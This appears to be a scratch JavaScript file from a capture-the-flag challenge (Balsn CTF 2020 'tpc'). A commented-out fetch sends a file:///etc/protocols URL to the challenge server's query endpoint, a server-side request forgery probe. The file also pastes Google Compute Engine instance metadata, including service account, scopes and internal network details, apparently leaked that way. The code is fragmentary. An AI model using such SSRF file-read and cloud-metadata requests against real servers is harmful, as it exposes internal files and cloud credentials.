const fs = require('fs');
const readline = require('readline');
const fileStream = fs.createReadStream('dict.txt');
const rl = readline.createInterface({
  input: fileStream,
  crlfDelay: Infinity
});
// Note: we use the crlfDelay option to recognize all instances of CR LF
// ('\r\n') in input.txt as a single line break.
for await (const line of rl) {
  // Each line in input.txt will be successively available here as `line`.
  console.log(`Line from file: ${line}`);
}
// for file in files {

//     fetch('http://35.194.175.80:8000/query?site=file:///etc/protocols')
//         .then(() => {
//             fs.writeFile('helloworld.txt', 'Hello World!', function (err) {
//                 if (err) return console.log(err);
//                 console.log('Hello World > helloworld.txt');
//             });
//         })
// }

const a = {
  "attributes":
    { "gce-container-declaration": "spec:\n containers:\n - name: tpc-1\n image: 'asia.gcr.io/balsn-ctf-2020-tpc/tpc:v3.14'\n stdin: false\n tty: false\n restartPolicy: Always\n\n# This container declaration format is not public API and may change without notice. Please\n# use gcloud command-line tool or Google Cloud Console to run Containers on Google Compute Engine.", "google-logging-enabled": "true" },
  "cpuPlatform": "Intel Broadwell", "description": "",
  "disks": [{ "deviceName": "tpc-1", "index": 0, "interface": "SCSI", "mode": "READ_WRITE", "type": "PERSISTENT" }],
  "guestAttributes": {},
  "hostname": "tpc-1.asia-east1-b.c.balsn-ctf-2020-tpc.internal",
  "id": 5022317673279747803,
  "image": "projects/cos-cloud/global/images/cos-stable-85-13310-1041-28",
  "legacyEndpointAccess": { "0.1": 6, "v1beta1": 1 },
  "licenses":
    [{ "id": "1001010" }, { "id": "6880041984096540132" }, { "id": "166739712233658766" }],
  "machineType": "projects/909684563558/machineTypes/e2-medium",
  "maintenanceEvent": "NONE",
  "name": "tpc-1",
  "networkInterfaces": [{
    "accessConfigs": [{ "externalIp": "35.194.175.80", "type": "ONE_TO_ONE_NAT" }],
    "dnsServers": ["169.254.169.254"],
    "forwardedIps": [],
    "gateway": "10.140.0.1",
    "ip": "10.140.0.8",
    "ipAliases": [],
    "mac": "42:01:0a:8c:00:08",
    "mtu": 1460,
    "network": "projects/909684563558/networks/default",
    "subnetmask": "255.255.240.0",
    "targetInstanceIps": []
  }],
  "preempted": "FALSE", "remainingCpuTime": -1,
  "scheduling":
    { "automaticRestart": "TRUE", "onHostMaintenance": "MIGRATE", "preemptible": "FALSE" },
  "serviceAccounts":
  {
    "909684563558-compute@developer.gserviceaccount.com":
    {
      "aliases": ["default"], "email": "909684563558-compute@developer.gserviceaccount.com",
      "scopes": ["https://www.googleapis.com/auth/devstorage.read_only",
        "https://www.googleapis.com/auth/logging.write",
        "https://www.googleapis.com/auth/monitoring.write",
        "https://www.googleapis.com/auth/servicecontrol",
        "https://www.googleapis.com/auth/service.management.readonly",
        "https://www.googleapis.com/auth/trace.append"]
    },
    "default": {
      "aliases": ["default"],
      "email": "909684563558-compute@developer.gserviceaccount.com",
      "scopes": ["https://www.googleapis.com/auth/devstorage.read_only",
        "https://www.googleapis.com/auth/logging.write",
        "https://www.googleapis.com/auth/monitoring.write",
        "https://www.googleapis.com/auth/servicecontrol",
        "https://www.googleapis.com/auth/service.management.readonly",
        "https://www.googleapis.com/auth/trace.append"]
    }
  }, "tags": ["allow-8000"], "virtualClock": { "driftToken": "0" },
  "zone": "projects/909684563558/zones/asia-east1-b"
}
